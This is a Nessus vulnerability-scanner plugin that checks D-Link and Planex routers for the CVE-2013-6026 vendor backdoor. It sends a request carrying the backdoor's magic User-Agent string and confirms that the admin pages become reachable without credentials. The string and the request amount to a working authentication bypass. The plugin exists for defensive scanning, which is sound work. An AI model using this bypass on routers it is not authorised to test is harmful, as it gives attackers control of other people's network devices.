#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(70447);
  script_version("$Revision: 1.7 $");
  script_cvs_date("$Date: 2015/09/24 21:08:38 $");

  script_cve_id("CVE-2013-6026");
  script_bugtraq_id(62990);
  script_osvdb_id(98429);
  script_xref(name:"CERT", value:"248083");

  script_name(english:"alpha_auth_check() Function Remote Authentication Bypass");
  script_summary(english:"Attempts to bypass login");

  script_set_attribute(
    attribute:"synopsis",
    value:
"The remote web server is affected by an authentication bypass
vulnerability."
  );
  script_set_attribute(
    attribute:"description",
    value:
"The remote web server is affected by an authentication bypass
vulnerability due to a flaw in the 'alpha_auth_check()' function.  A
remote, unauthenticated attacker can exploit this issue by sending a
request with the user agent string set to
'xmlset_roodkcableoj28840ybtide'.  This could allow the attacker to
bypass authentication and gain access to the device using a
vendor-supplied backdoor. 

Note that several D-Link and Planex model routers are reportedly
affected by this issue."
  );
  script_set_attribute(attribute:"see_also", value:"http://www.devttys0.com/2013/10/reverse-engineering-a-d-link-backdoor/");
  # http://securityadvisories.dlink.com/security/publication.aspx?name=SAP10001
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?764b1d41");
  script_set_attribute(attribute:"solution", value:
"If the affected router is a DIR-100, DIR-120, DI-524, DI-524UP,
DI-604UP, DI-604+, DI-624S, or TM-G5240, apply the appropriate firmware
update.  Otherwise, contact the vendor or replace the router.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_set_cvss_temporal_vector("CVSS2#E:ND/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2013/10/12");
  script_set_attribute(attribute:"plugin_publication_date", value:"2013/10/15");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/h:d-link:router");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2013-2015 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_require_ports("Services/www", 80);
  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

port = get_http_port(default:80, embedded:TRUE);

banner = get_http_banner(port:port, exit_on_fail:TRUE);
if ("thttpd-alphanetworks/" >!< banner && "Alpha_webserv" >!< banner) audit(AUDIT_HOST_NOT, "affected");

res = http_send_recv3(
  method : "GET",
  port   : port,
  item   : "/",
  add_headers  : make_array("User-Agent", "xmlset_roodkcableoj28840ybtide"),
  follow_redirect: 1,
  exit_on_fail : TRUE
);

if (
  res[0] =~ "200" &&
  "Home/bsc_internet.htm" >< res[2] &&
  "/public/logout.htm" >< res[2]
)
{
  req = http_last_sent_request();

  # Unless we're paranoid, make sure the page is not accessible without the User-Agent header.
  if (report_paranoia < 2)
  {
    res2 = http_send_recv3(
      method : "GET",
      port   : port,
      item   : "/",
      follow_redirect: 1,
      exit_on_fail : TRUE
    );

    if (
      res2[0] =~ "200" &&
      "Home/bsc_internet.htm" >< res2[2] &&
      "/public/logout.htm" >< res2[2]
    ) exit(0, "The web server on port "+port+" does not require credentials.");
  }

  if (report_verbosity > 0)
  {
    report =
     '\nNessus was able to verify this issue by sending the following request :' +
     '\n' +
     '\n' + req +
     '\n';
    security_hole(port:port, extra:report);
  }
  else security_hole(port);
  exit(0);
}
else audit(AUDIT_HOST_NOT, "affected");
